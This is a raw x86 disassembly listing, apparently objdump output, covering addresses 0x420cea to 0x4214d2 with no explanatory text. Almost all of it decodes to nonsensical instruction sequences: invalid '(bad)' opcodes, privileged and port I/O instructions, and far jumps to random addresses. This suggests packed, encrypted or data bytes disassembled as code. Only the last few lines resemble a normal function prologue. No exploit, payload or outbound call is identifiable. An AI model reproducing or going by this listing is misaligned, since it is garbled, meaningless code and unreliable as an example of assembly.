  420cea:	bound  edi,QWORD PTR [esi+0x33f54ef3]
  420cf0:	mov    dl,0x58
  420cf2:	test   DWORD PTR [ecx+esi*1],ebx
  420cf5:	mov    ebp,0x51b1056f
  420cfa:	fidivr DWORD PTR [eax]
  420cfc:	sub    edx,DWORD PTR [edx-0x5c681dc3]
  420d02:	rol    DWORD PTR [esi-0x467542f6],cl
  420d08:	cmc    
  420d09:	inc    edx
  420d0a:	xchg   esi,eax
  420d0b:	push   ss
  420d0c:	mov    eax,ds:0x6a7a8050
  420d11:	add    al,0x2d
  420d13:	xor    eax,0x7f
  420d16:	out    0xbe,al
  420d18:	mov    dh,0xab
  420d1a:	push   fs
  420d1c:	scas   al,BYTE PTR es:[edi]
  420d1d:	xchg   ebp,eax
  420d1f:	dec    esp
  420d20:	imul   BYTE PTR [edx-0x7f77363a]
  420d26:	fwait
  420d27:	and    al,BYTE PTR [edx-0x38]
  420d2a:	cs xor bl,bl
  420d2d:	mov    edi,esi
  420d2f:	daa    
  420d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d31:	sahf   
  420d32:	sysexit 
  420d34:	ret    0xc41c
  420d37:	and    BYTE PTR [esi-0x6062ba64],ah
  420d3d:	inc    eax
  420d3e:	aad    0x9d
  420d40:	call   0x283fb5e2
  420d45:	push   esp
  420d46:	add    BYTE PTR [ecx-0x5d],dh
  420d49:	sbb    BYTE PTR [esi+edx*1+0x3e],0xb5
  420d4e:	ror    DWORD PTR [ecx],cl
  420d50:	dec    edx
  420d51:	lods   eax,DWORD PTR ds:[esi]
  420d52:	inc    esi
  420d53:	inc    eax
  420d54:	mov    ebp,0xd6d9608c
  420d59:	idiv   BYTE PTR ds:0x599afa7b
  420d5f:	fs cmp ebp,edx
  420d62:	pusha  
  420d63:	mov    edi,DWORD PTR [esi-0x74bd2a46]
  420d69:	pop    ebx
  420d6a:	sub    DWORD PTR [edi+0x2e],esi
  420d6d:	jns    0x420dc1
  420d6f:	popa   
  420d70:	outs   dx,BYTE PTR ds:[esi]
  420d71:	jmp    0x420d33
  420d73:	std    
  420d74:	cmp    eax,0xd6848fd4
  420d79:	loope  0x420d56
  420d7b:	pusha  
  420d7c:	mov    ecx,0x30e76dc9
  420d81:	jle    0x420d9b
  420d83:	adc    al,dl
  420d85:	pushf  
  420d86:	and    dh,BYTE PTR [ebx+0x7a]
  420d89:	fidiv  DWORD PTR [ebp+0x3f]
  420d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d8d:	xor    DWORD PTR [esi+0x51d97a5],esp
  420d93:	int3   
  420d94:	mov    al,0x81
  420d96:	dec    edi
  420d97:	addr16 in al,dx
  420d99:	add    eax,0x8d3f708c
  420d9e:	ret    
  420d9f:	adc    al,0x3b
  420da1:	jb     0x420daf
  420da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da4:	adc    ecx,DWORD PTR [edx+0x6e248d34]
  420daa:	call   0x46ad9c82
  420daf:	cmp    edi,DWORD PTR [edx+0x7bb59087]
  420db5:	call   0xce22:0xbe1caa32
  420dbc:	test   al,0x90
  420dbe:	add    bh,BYTE PTR [ebx+0x16]
  420dc1:	ja     0x420e34
  420dc3:	mov    DWORD PTR [ecx],eax
  420dc5:	sahf   
  420dc6:	lods   al,BYTE PTR ds:[esi]
  420dc7:	mov    dh,0xb3
  420dc9:	push   0xd174b999
  420dce:	jno    0xe831252
  420dd4:	(bad)  
  420dd5:	hlt    
  420dd6:	xor    bh,BYTE PTR ds:0x3bb5e132
  420ddc:	popa   
  420ddd:	pop    edi
  420dde:	jmp    0xbab5:0x9f0bdbc3
  420de5:	ja     0x420e4b
  420de7:	add    bh,BYTE PTR [edi+0x1a8bd6]
  420ded:	adc    al,0x2b
  420def:	mov    ebx,0x7a82f296
  420df4:	xor    esp,DWORD PTR [ebx+0x5c744f97]
  420dfa:	inc    ebx
  420dfb:	pusha  
  420dfc:	and    edx,DWORD PTR [esp+edi*2-0x37]
  420e00:	dec    edx
  420e01:	setbe  BYTE PTR [eax+edi*8]
  420e05:	adc    ebp,eax
  420e07:	aaa    
  420e08:	retf   
  420e09:	pop    eax
  420e0a:	push   es
  420e0b:	inc    edx
  420e0c:	sbb    BYTE PTR [ebp+0x36],al
  420e0f:	rol    DWORD PTR [edi-0x2e],0xd9
  420e13:	push   ebx
  420e14:	jns    0x420e40
  420e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e17:	test   eax,0xd75a29ca
  420e1c:	ins    DWORD PTR es:[edi],dx
  420e1d:	sti    
  420e1e:	or     al,0x6c
  420e20:	repnz (bad) 
  420e22:	cmp    eax,0x514c39e5
  420e27:	repz ss call 0x65d2de37
  420e2e:	xchg   DWORD PTR [ecx+0x3bb7df08],esp
  420e34:	jg     0x420e7b
  420e36:	sub    eax,0xf55154ea
  420e3b:	cmp    DWORD PTR [ebx-0x587ff9a3],ebp
  420e41:	lea    ecx,[ebx-0x39c54520]
  420e47:	loope  0x420e85
  420e49:	add    al,0xbd
  420e4b:	sbb    BYTE PTR [ebp*1+0x2edc5ab9],bh
  420e52:	and    ch,BYTE PTR [ebx]
  420e54:	sub    al,0x47
  420e56:	mov    ds:0x8432b3bb,eax
  420e5b:	inc    esp
  420e5c:	(bad)  
  420e5d:	and    BYTE PTR [ebx+0x3e],bh
  420e60:	jl     0x420ed3
  420e62:	dec    edi
  420e63:	fstp   QWORD PTR [edx]
  420e65:	mov    ds:0xc17bfe59,eax
  420e6a:	or     DWORD PTR [ecx-0x5d],eax
  420e6d:	lods   al,BYTE PTR ds:[esi]
  420e6e:	pop    ecx
  420e6f:	push   cs
  420e70:	cld    
  420e71:	sbb    eax,0x91d2bc6d
  420e76:	inc    ebx
  420e77:	bound  ebp,QWORD PTR [ebp-0x3dbc1c8b]
  420e7d:	and    DWORD PTR [ecx],edx
  420e7f:	scas   eax,DWORD PTR es:[edi]
  420e80:	mov    esi,0x5680a2fb
  420e85:	adc    DWORD PTR [ecx],edx
  420e87:	sahf   
  420e88:	or     ebx,ebp
  420e8a:	push   esi
  420e8b:	xor    BYTE PTR [edx],bh
  420e8d:	sub    al,0x3a
  420e8f:	adc    eax,0xb6c51e29
  420e94:	fild   WORD PTR [edi+0x1b]
  420e97:	pop    ecx
  420e98:	out    0x94,al
  420e9a:	mov    edi,0xf4ef5217
  420e9f:	jae    0x420e8e
  420ea1:	mov    eax,0xf3502fae
  420ea6:	es jo  0x420eb7
  420ea9:	lea    ebp,[edx]
  420eab:	pop    esi
  420eac:	pop    esi
  420ead:	out    0x3c,eax
  420eaf:	xor    edx,esp
  420eb1:	mov    ds:0x467cd0ae,al
  420eb6:	(bad)  
  420eb7:	mov    ebx,0x6b3d974e
  420ebc:	es sub al,0x32
  420ebf:	call   FWORD PTR [ecx-0xbb2204c]
  420ec5:	add    bl,BYTE PTR [ecx]
  420ec7:	xchg   esp,eax
  420ec8:	cmp    DWORD PTR [edi+0x1d3e3e93],eax
  420ece:	mov    ebp,0x5955cf51
  420ed3:	out    0x79,eax
  420ed5:	(bad)  
  420ed6:	(bad)  
  420ed7:	sti    
  420ed8:	sbb    al,0xd2
  420eda:	mov    DWORD PTR [edi-0x66253623],ebp
  420ee0:	adc    edx,edi
  420ee2:	jno    0x420eab
  420ee4:	popf   
  420ee5:	loopne 0x420f04
  420ee7:	test   al,0x89
  420ee9:	clc    
  420eea:	push   0x4
  420eec:	xchg   esi,eax
  420eed:	fsub   QWORD PTR [ecx-0x571fc5b0]
  420ef3:	lods   eax,DWORD PTR ds:[esi]
  420ef4:	mov    ah,ah
  420ef6:	fucomp st(4)
  420ef8:	mov    ebx,0x72d8cd2c
  420efd:	jle    0x420ef4
  420eff:	enter  0xa88d,0xb1
  420f03:	fidiv  DWORD PTR [eax]
  420f05:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420f07:	ins    BYTE PTR es:[edi],dx
  420f08:	sbb    al,cl
  420f0a:	jne    0x420eb8
  420f0c:	fistp  WORD PTR [esi]
  420f0e:	lods   eax,DWORD PTR ds:[esi]
  420f0f:	pusha  
  420f10:	and    eax,0x49dd7ca1
  420f15:	(bad)  
  420f16:	sbb    al,0xb9
  420f18:	inc    ebp
  420f19:	scas   eax,DWORD PTR es:[edi]
  420f1a:	loop   0x420e9c
  420f1c:	lock sub al,0x2d
  420f1f:	lods   eax,DWORD PTR ds:[esi]
  420f20:	lahf   
  420f21:	popa   
  420f22:	adc    dl,BYTE PTR [eax-0xb996381]
  420f28:	mov    cl,0x9
  420f2a:	ins    BYTE PTR es:[edi],dx
  420f2b:	sbb    eax,0x7d5b880c
  420f30:	and    ch,BYTE PTR [esi]
  420f32:	inc    esi
  420f33:	jp     0x420fa2
  420f35:	push   es
  420f36:	cmp    DWORD PTR [esi],esp
  420f38:	add    ebp,0x79fb1b91
  420f3e:	pop    esi
  420f3f:	mov    ebp,0x48d5aa70
  420f44:	dec    edx
  420f45:	xor    eax,0xf7f06d4c
  420f4a:	iret   
  420f4b:	in     al,dx
  420f4c:	or     DWORD PTR [esi-0x6bd6967f],ebx
  420f52:	rol    DWORD PTR [edi-0x49a21ddb],0x25
  420f59:	jb     0x420f3a
  420f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f5c:	loope  0x420f61
  420f5e:	(bad)  
  420f5f:	outs   dx,BYTE PTR ds:[esi]
  420f60:	cmp    edx,DWORD PTR ss:[edi+0x36]
  420f64:	jle    0x420f71
  420f66:	jmp    0x8047e4b5
  420f6b:	mov    BYTE PTR [ecx],0x42
  420f6e:	fadd   DWORD PTR [ebx]
  420f70:	mov    ebp,0x70f4fcb0
  420f75:	xchg   BYTE PTR [edi-0x58],ah
  420f78:	adc    eax,0x4946353e
  420f7d:	lock add DWORD PTR [edx],esp
  420f80:	jae    0x420f6d
  420f82:	stos   DWORD PTR es:[edi],eax
  420f83:	fnstenv [esi+eiz*4]
  420f86:	push   ebp
  420f87:	mov    eax,0x26fab1ce
  420f8c:	jae    0x420fca
  420f8e:	int3   
  420f8f:	addr16 sti 
  420f91:	xor    ch,BYTE PTR [edi+0x7b]
  420f94:	aad    0x22
  420f96:	addr16 mov eax,ds:0xc23e
  420f9a:	mov    ds:0x1d8bcc68,eax
  420f9f:	pusha  
  420fa0:	mov    WORD PTR [ecx+0x1b2ea604],fs
  420fa6:	xor    cl,BYTE PTR [esi+eax*2-0x57]
  420faa:	inc    ebp
  420fab:	das    
  420fac:	xchg   ebp,eax
  420fad:	mov    esi,0x7431579e
  420fb2:	jne    0x420fcd
  420fb4:	inc    ebx
  420fb5:	xchg   ecx,eax
  420fb6:	jno    0x420f4a
  420fb8:	add    dh,BYTE PTR [ebx]
  420fba:	sub    ch,al
  420fbc:	cmp    DWORD PTR [esi-0x692f0062],eax
  420fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fc3:	jnp    0x420f7e
  420fc5:	cmp    dh,BYTE PTR [edi]
  420fc7:	cs pushf 
  420fc9:	jecxz  0x421044
  420fcb:	loopne 0x420f85
  420fcd:	sbb    al,0x41
  420fcf:	cmp    al,0xac
  420fd1:	fisttp QWORD PTR [edi+0x35]
  420fd4:	inc    esi
  420fd5:	jmp    0xf605829
  420fda:	cmp    al,0xbf
  420fdc:	jns    0x420f89
  420fde:	aam    0x13
  420fe0:	add    al,0x99
  420fe2:	pop    ds
  420fe3:	cmp    BYTE PTR [eax+0x77],bl
  420fe6:	sahf   
  420fe7:	sub    dl,dh
  420fe9:	add    eax,0x47d735ab
  420fee:	ins    BYTE PTR es:[edi],dx
  420fef:	cdq    
  420ff0:	sub    cl,dh
  420ff2:	data16 mov al,ds:0xace32fcc
  420ff9:	jne    0x421070
  420ffb:	pop    edi
  420ffc:	xor    ebp,ecx
  420ffe:	push   esp
  420fff:	add    DWORD PTR [ecx],ecx
  421001:	sub    cl,BYTE PTR [ecx+0x5db8b526]
  421007:	cld    
  421008:	mov    esi,esi
  42100a:	and    ah,BYTE PTR [ebp-0x38a1b348]
  421010:	aaa    
  421011:	das    
  421012:	xchg   cl,ch
  421014:	mov    ds:0x9eb05385,al
  421019:	(bad)  
  42101b:	mov    bl,0xf1
  42101d:	and    cl,ch
  42101f:	fst    QWORD PTR [ebx-0x6e3d1841]
  421025:	in     al,dx
  421026:	mov    ds:0xc5809a58,al
  42102b:	sbb    eax,0x4e9dd527
  421030:	shl    BYTE PTR [esi+0x30707ef7],0xf1
  421037:	out    dx,eax
  421038:	ret    0x70e6
  42103b:	lods   al,BYTE PTR ds:[esi]
  42103c:	mov    dh,0x7b
  42103e:	lods   eax,DWORD PTR cs:[esi]
  421040:	pushf  
  421041:	pop    ds
  421042:	inc    edx
  421043:	inc    edx
  421044:	retf   
  421045:	retf   0xab35
  421048:	add    ecx,DWORD PTR [edi-0x6e]
  42104b:	pop    ds
  42104c:	retf   0xe16
  42104f:	js     0x421067
  421051:	popf   
  421052:	(bad)  
  421053:	mov    ds:0x73db9fc9,al
  421058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421059:	outs   dx,DWORD PTR gs:[esi]
  42105b:	jmp    0x421062
  42105d:	cmp    edx,0xffffffed
  421060:	mov    ah,0x67
  421062:	push   0x73bad8b9
  421067:	xchg   edi,eax
  421068:	cmp    ebx,DWORD PTR [esp+ecx*2+0x1693a734]
  42106f:	pop    edi
  421070:	hlt    
  421071:	sbb    BYTE PTR [ebp+esi*8+0x64],0xf8
  421076:	mov    esp,0xa5e01997
  42107b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42107c:	sbb    al,0xc4
  42107e:	xor    eax,0x1c8b9dbd
  421083:	test   bl,ch
  421085:	xor    esp,DWORD PTR [ebx+0x219cb885]
  42108b:	jmp    0x4210f7
  42108d:	push   edx
  42108e:	test   DWORD PTR [ebx-0x2d],ebp
  421091:	rol    BYTE PTR [edi+0x379d6d9b],1
  421097:	in     eax,dx
  421098:	or     DWORD PTR [edi-0x36],ebx
  42109b:	mov    ds:0xecd55c59,eax
  4210a0:	jae    0x42108f
  4210a2:	(bad)  
  4210a3:	push   ss
  4210a4:	push   ss
  4210a5:	mov    esp,0xd5b654a8
  4210aa:	lods   eax,DWORD PTR ds:[si]
  4210ac:	push   ecx
  4210ad:	addr16 (bad) 
  4210af:	popf   
  4210b0:	nop
  4210b1:	cmp    eax,DWORD PTR [edx]
  4210b3:	pop    ebp
  4210b4:	ins    BYTE PTR es:[edi],dx
  4210b5:	je     0x42107d
  4210b7:	dec    edx
  4210b8:	push   edi
  4210b9:	popf   
  4210ba:	rol    DWORD PTR [edx-0x43],cl
  4210bd:	sbb    ah,BYTE PTR [ebp-0x5]
  4210c0:	cmp    WORD PTR [esi],dx
  4210c3:	mov    ch,0x1f
  4210c5:	lock cmp DWORD PTR [eax-0x61ec37fa],ebp
  4210cc:	sub    dl,dh
  4210ce:	xchg   DWORD PTR [ebx],eax
  4210d0:	pop    es
  4210d1:	(bad)  
  4210d2:	cld    
  4210d3:	les    ebx,FWORD PTR [ebp-0x39]
  4210d6:	jae    0x421098
  4210d8:	xor    al,0x32
  4210da:	rol    al,0xf3
  4210dd:	jmp    0xbb81:0x6e265901
  4210e4:	aas    
  4210e5:	std    
  4210e6:	mov    DWORD PTR [esi],edi
  4210e8:	pusha  
  4210e9:	xor    bh,BYTE PTR [edx+eiz*4+0x3f]
  4210ed:	adc    al,0xb0
  4210ef:	(bad)  
  4210f0:	cmp    ch,bl
  4210f2:	push   cs
  4210f3:	aam    0x9d
  4210f5:	cli    
  4210f6:	ds test al,0x7b
  4210f9:	or     cl,BYTE PTR [esi+eiz*8]
  4210fc:	fcom   DWORD PTR [edx]
  4210fe:	out    0x52,eax
  421100:	je     0x421148
  421102:	cmc    
  421103:	or     DWORD PTR [edx-0x7736bc59],eax
  421109:	mov    bh,0xcc
  42110b:	loopne 0x421134
  42110d:	mov    DWORD PTR [ebx+0x389f1150],ebp
  421113:	loop   0x4210cc
  421115:	daa    
  421116:	push   0x49
  421118:	dec    ecx
  421119:	add    al,BYTE PTR [esi]
  42111b:	ins    BYTE PTR es:[edi],dx
  42111c:	clc    
  42111d:	jecxz  0x4210ed
  42111f:	cmp    DWORD PTR [eax+0x64702294],0x7d
  421126:	fnstsw WORD PTR [ebp-0xb]
  421129:	and    dh,dl
  42112b:	(bad)  
  42112c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42112d:	out    0x79,al
  42112f:	mov    esi,0x4883dd2c
  421134:	add    cl,ch
  421136:	pop    ebp
  421137:	push   esp
  421138:	pop    ebp
  421139:	sahf   
  42113a:	in     al,dx
  42113b:	sub    eax,0xd5a34586
  421140:	pusha  
  421141:	mov    esi,0xce6a622e
  421146:	(bad)  
  421147:	fbstp  TBYTE PTR [ebx+0x2c3fe1b1]
  42114d:	push   ecx
  42114e:	mov    al,0xc3
  421150:	inc    edx
  421151:	jne    0x4210f8
  421153:	adc    al,bl
  421155:	mov    ch,0x61
  421158:	test   BYTE PTR [esi+ecx*8-0x55c08893],0x29
  421160:	or     BYTE PTR ds:0x1080943b,bl
  421166:	dec    eax
  421167:	mov    esi,0x233af78c
  42116c:	sahf   
  42116d:	mov    ds:0xddd13b08,eax
  421172:	mov    dh,0xc4
  421174:	fld    QWORD PTR [esi+0x247732e6]
  42117a:	sub    bh,BYTE PTR [ebp-0x4c9825bb]
  421180:	mov    al,ds:0x399513e8
  421185:	dec    ebx
  421186:	jnp    0x42113b
  421188:	fadd   QWORD PTR [eax+0x5476ddd0]
  42118e:	enter  0xa698,0x28
  421192:	mov    ebx,0x8930766
  421197:	stc    
  421198:	int3   
  421199:	jp     0x42112f
  42119b:	push   ebx
  42119c:	rcl    DWORD PTR [ebp-0x5577acdb],0xb7
  4211a3:	sub    ah,BYTE PTR [ebx+esi*1-0x25]
  4211a7:	mov    al,0xbb
  4211a9:	call   0x471abf85
  4211ae:	mov    eax,ds:0xc068dbf7
  4211b3:	add    dl,BYTE PTR [edx+edx*2-0x5e]
  4211b7:	rcl    dh,1
  4211b9:	cwde   
  4211ba:	push   es
  4211bb:	iret   
  4211bc:	sahf   
  4211bd:	lds    edi,FWORD PTR [edi-0x51]
  4211c0:	sub    DWORD PTR [edi],ecx
  4211c2:	into   
  4211c3:	dec    esi
  4211c4:	leave  
  4211c5:	push   ecx
  4211c6:	adc    bl,bh
  4211c8:	in     al,dx
  4211c9:	aaa    
  4211ca:	pop    edi
  4211cb:	imul   esi,DWORD PTR ds:0x740c00ea,0xc498a32c
  4211d5:	cs pop ss
  4211d7:	nop
  4211d8:	call   0xc07cc407
  4211dd:	inc    ebp
  4211de:	ret    
  4211df:	out    0x9d,eax
  4211e1:	xor    eax,ebp
  4211e3:	mov    edx,ecx
  4211e5:	mov    ebx,0x6bdb6438
  4211ea:	repnz in al,dx
  4211ec:	mov    edi,edi
  4211ee:	shl    edi,cl
  4211f0:	sub    al,0xe3
  4211f2:	bound  ecx,QWORD PTR [eax+ebp*1]
  4211f5:	das    
  4211f6:	inc    eax
  4211f7:	(bad)  
  4211f8:	sbb    cl,ah
  4211fa:	inc    esi
  4211fb:	loope  0x421196
  4211fd:	icebp  
  4211fe:	xlat   BYTE PTR ds:[ebx]
  4211ff:	sub    ah,ch
  421201:	and    eax,0xefe2b411
  421206:	sub    ah,dh
  421208:	test   WORD PTR [ecx-0x64],si
  42120c:	jge    0x421247
  42120e:	lock pusha 
  421210:	xchg   ebx,eax
  421211:	(bad)  
  421212:	into   
  421213:	dec    edx
  421214:	pop    ss
  421215:	shl    DWORD PTR [ecx],0xfc
  421218:	mov    bh,0x2c
  42121a:	test   BYTE PTR [ecx],cl
  42121c:	pop    esi
  42121d:	or     ebx,DWORD PTR [ebx+ebx*4+0x9c8ca31]
  421224:	mov    BYTE PTR [esi],bh
  421226:	inc    ecx
  421227:	push   edx
  421228:	pop    ds
  421229:	fisub  WORD PTR [esi+edi*4]
  42122c:	test   DWORD PTR [ebx+0x16],0xc6cb9e64
  421233:	sub    eax,edi
  421235:	mov    bl,0xfd
  421237:	(bad)  
  421238:	in     eax,0xee
  42123a:	(bad)  [ebx-0x44501c32]
  421240:	jns    0x421219
  421242:	dec    ebp
  421243:	mov    eax,edi
  421245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421246:	jo     0x421207
  421248:	pop    ss
  421249:	mov    dh,0xaa
  42124b:	clc    
  42124c:	cwde   
  42124d:	or     edi,DWORD PTR [edx+0x331ac452]
  421253:	(bad)  
  421254:	aaa    
  421255:	call   0xfeef67e3
  42125a:	sbb    DWORD PTR [eax],eax
  42125c:	fbstp  TBYTE PTR [ebp-0x2ed6f6a7]
  421262:	jl     0x421226
  421264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421265:	idiv   DWORD PTR [esi-0x47a15512]
  42126b:	or     ebp,DWORD PTR [ecx-0x18f4a73c]
  421271:	fdivrp st(0),st
  421273:	adc    BYTE PTR [ecx],0x6a
  421276:	rcr    ebx,1
  421278:	jge    0x421221
  42127a:	jo     0x42125a
  42127c:	jbe    0x421261
  42127e:	pop    ecx
  42127f:	adc    BYTE PTR [ecx-0x43],bl
  421282:	hlt    
  421283:	popa   
  421284:	pop    ds
  421285:	ret    
  421286:	mov    eax,0xa3b873c4
  42128b:	daa    
  42128c:	inc    ebp
  42128d:	pop    ecx
  42128e:	or     al,0x89
  421290:	jo     0x4212ea
  421292:	(bad)  
  421293:	retf   
  421294:	xchg   esp,eax
  421295:	dec    esp
  421296:	push   eax
  421297:	jg     0x421232
  421299:	cdq    
  42129a:	(bad)  
  42129b:	fbld   TBYTE PTR [esi+0x69]
  42129e:	and    ah,BYTE PTR [ebx+0xb2e92ff]
  4212a4:	adc    cl,BYTE PTR [edi]
  4212a6:	std    
  4212a7:	cmp    ah,bl
  4212a9:	leave  
  4212aa:	add    eax,0xc847a65f
  4212af:	jnp    0x4212cb
  4212b1:	mov    al,0x25
  4212b3:	cmp    al,0x52
  4212b5:	mov    ecx,0xe8a01596
  4212ba:	sbb    BYTE PTR [esi],ah
  4212bc:	mov    dl,0xa0
  4212be:	rcl    BYTE PTR [eax-0x3a64e3f5],cl
  4212c4:	fisub  DWORD PTR [ebp+0x24]
  4212c7:	push   ss
  4212c8:	enter  0xc524,0xa2
  4212cc:	mov    ds:0x8095b79c,eax
  4212d1:	enter  0x9620,0xc9
  4212d5:	cwde   
  4212d6:	jl     0x42130c
  4212d8:	mov    esp,0x7650dc4b
  4212dd:	hlt    
  4212de:	jnp    0x42128e
  4212e0:	xchg   esp,eax
  4212e1:	into   
  4212e2:	push   ebp
  4212e3:	pop    ebx
  4212e4:	sub    BYTE PTR ds:0x90b721a3,ch
  4212ea:	jmp    0x7ef57bb5
  4212ef:	test   DWORD PTR ds:0x48c5e8dc,edi
  4212f5:	lds    esi,FWORD PTR [esi+0x4b30c8fa]
  4212fb:	push   0xffffffc3
  4212fd:	fsubr  DWORD PTR [ebx+0x4d8de922]
  421303:	scas   al,BYTE PTR es:[edi]
  421304:	mov    ds:0xcea42e73,eax
  421309:	call   0x3b757616
  42130e:	mov    edx,0xa6ac219b
  421313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421314:	jmp    0x92c1ce06
  421319:	sbb    ecx,DWORD PTR [edx-0x1e424067]
  42131f:	test   al,0xbc
  421321:	shr    esi,1
  421323:	(bad)  
  421324:	sbb    eax,0xc63940a8
  421329:	call   0x35a3:0x28b22efe
  421330:	outs   dx,BYTE PTR ds:[esi]
  421331:	lods   eax,DWORD PTR ds:[esi]
  421332:	daa    
  421333:	xchg   esi,eax
  421334:	push   ecx
  421335:	(bad)  
  421336:	mov    ds:0xc4f5214a,eax
  42133b:	jg     0x4212c9
  42133d:	mov    esp,0x598ca134
  421342:	mov    DWORD PTR [edi],esp
  421344:	adc    DWORD PTR [edi],edx
  421346:	add    ch,0xd5
  421349:	inc    edx
  42134a:	das    
  42134b:	pop    esp
  42134c:	cmp    DWORD PTR [ebp-0x47],edi
  42134f:	(bad)  
  421350:	outs   dx,DWORD PTR ds:[esi]
  421351:	int3   
  421352:	shl    DWORD PTR [ecx+0x4a11ffb3],cl
  421358:	xor    DWORD PTR [edi-0x78],0x693414a0
  42135f:	imul   eax,ebx,0xffffffe8
  421362:	pop    es
  421363:	call   0x2d309167
  421368:	jae    0x42133d
  42136a:	repnz inc ecx
  42136c:	xchg   esi,eax
  42136d:	pusha  
  42136e:	pop    ds
  42136f:	sub    esi,DWORD PTR [edx+0x48a7d1e]
  421375:	stos   DWORD PTR es:[edi],eax
  421376:	jge    0x421300
  421378:	mov    esi,0x4f86d6a0
  42137d:	addr16 aas 
  42137f:	ficomp WORD PTR [ebp-0x462a6422]
  421385:	jbe    0x421347
  421387:	and    eax,0xa31d07b3
  42138c:	sbb    BYTE PTR [edx-0x345e42e3],0x84
  421393:	jmp    0x6f75dccb
  421398:	sub    bl,al
  42139a:	add    cl,dh
  42139c:	push   esi
  42139d:	stc    
  42139e:	cwde   
  42139f:	xor    DWORD PTR [ecx+0x30],esp
  4213a2:	cmp    al,0xa4
  4213a4:	push   esp
  4213a5:	fsub   QWORD PTR [ebx+0x54]
  4213a8:	cli    
  4213a9:	xchg   esp,eax
  4213aa:	dec    edx
  4213ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213ac:	fst    QWORD PTR [edx]
  4213ae:	(bad)
  4213b2:	imul   edi,DWORD PTR [edi+0x68],0xb872a83b
  4213b9:	ror    BYTE PTR [edx],cl
  4213bb:	adc    dh,BYTE PTR [ecx]
  4213bd:	sbb    dl,BYTE PTR [esi]
  4213bf:	dec    eax
  4213c0:	inc    ecx
  4213c1:	test   al,0x55
  4213c3:	mov    ds:0x9cb8d59f,al
  4213c8:	jge    0x42143c
  4213ca:	jmp    0x421430
  4213cc:	ret    0x6c7e
  4213cf:	pop    edx
  4213d0:	pop    ecx
  4213d1:	mov    ebx,0x972a2993
  4213d6:	xchg   BYTE PTR [eax+0x3c],ah
  4213d9:	xor    BYTE PTR [esi+0x48],ch
  4213dc:	bound  eax,QWORD PTR [edi+0x24]
  4213df:	enter  0x34c6,0x5c
  4213e3:	or     BYTE PTR [ebx+0x50],al
  4213e6:	xchg   edx,eax
  4213e7:	xchg   edi,eax
  4213e8:	jl     0x421372
  4213ea:	inc    eax
  4213eb:	sbb    DWORD PTR [edx-0xc3a8943],0x9
  4213f2:	call   0x3e3bcf94
  4213f7:	in     eax,0xa7
  4213f9:	es cwde 
  4213fb:	aam    0x57
  4213fd:	and    cl,BYTE PTR [esi-0x33]
  421400:	test   DWORD PTR [ebp-0x543f4a44],edi
  421406:	popf   
  421407:	pushf  
  421408:	fdivr  st(3),st
  42140a:	xchg   ah,al
  42140c:	fdivr  st(7),st
  42140e:	aaa    
  42140f:	sbb    ch,al
  421411:	aas    
  421412:	sbb    eax,0xc289deb0
  421417:	cmp    al,0x29
  421419:	test   al,al
  42141b:	aam    0xee
  42141d:	loopne 0x421496
  42141f:	jb     0x4213d7
  421421:	pop    edi
  421422:	enter  0xc2be,0x19
  421426:	push   eax
  421427:	jne    0x421456
  421429:	or     BYTE PTR [ebx],0xbd
  42142c:	jnp    0x4213ba
  42142e:	or     edx,DWORD PTR [eax+0x40]
  421431:	push   0xe0551c6d
  421436:	dec    ecx
  421437:	sar    DWORD PTR [ebp-0x3],cl
  42143a:	or     DWORD PTR [edx-0x6b0f9671],0xffffffef
  421441:	jno    0x4214bc
  421443:	jb     0x421461
  421445:	xchg   cl,ch
  421447:	push   edx
  421448:	cmp    BYTE PTR [eax],dl
  42144a:	mov    eax,0xc5146c2
  42144f:	xchg   ebp,eax
  421450:	icebp  
  421451:	jbe    0x4214a8
  421453:	mov    WORD PTR [ebx-0x4e],ss
  421456:	xor    DWORD PTR [ecx+0x6663442d],esp
  42145c:	inc    esi
  42145d:	xor    eax,0x6a5b8c9f
  421462:	aas    
  421463:	xchg   ecx,eax
  421464:	fdiv   QWORD PTR [eax+0x5e7dfa36]
  42146a:	ja     0x421411
  42146c:	mov    cl,0x6a
  42146e:	push   esp
  42146f:	push   edi
  421470:	jb     0x4214b5
  421472:	add    DWORD PTR gs:[edx+0x11],esi
  421476:	mov    ebp,0x5fec1036
  42147b:	js     0x4214d3
  42147d:	fnstsw WORD PTR ds:0xe81d332
  421483:	push   es
  421484:	mov    al,0x73
  421486:	add    DWORD PTR [edx],ebx
  421488:	fild   WORD PTR [edx+esi*4]
  42148b:	xchg   esp,eax
  42148c:	inc    eax
  42148d:	out    dx,eax
  42148e:	push   edx
  42148f:	imul   ecx,DWORD PTR [esi*8+0x20e17ddc],0x3b
  421497:	(bad)  
  421498:	mov    ecx,DWORD PTR [ebx+0x46]
  42149b:	sub    al,0x56
  42149d:	mov    esp,DWORD PTR [edi]
  42149f:	jl     0x421473
  4214a1:	test   al,0xed
  4214a3:	mov    ds:0xd8778811,eax
  4214a8:	out    dx,al
  4214a9:	cwde   
  4214aa:	inc    esi
  4214ab:	jge    0x4214cd
  4214ad:	xchg   esp,ecx
  4214af:	push   ds
  4214b0:	(bad)  
  4214b1:	fild   QWORD PTR [esi+0x1a]
  4214b4:	mov    ds:0x34341fae,eax
  4214b9:	pop    edi
  4214ba:	xchg   esp,eax
  4214bb:	push   0x4a
  4214bd:	jle    0x4214d5
  4214bf:	pop    esi
  4214c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214c1:	cld    
  4214c2:	mov    edx,0x4947be12
  4214c7:	dec    ebp
  4214c8:	jmp    0x9105d500
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
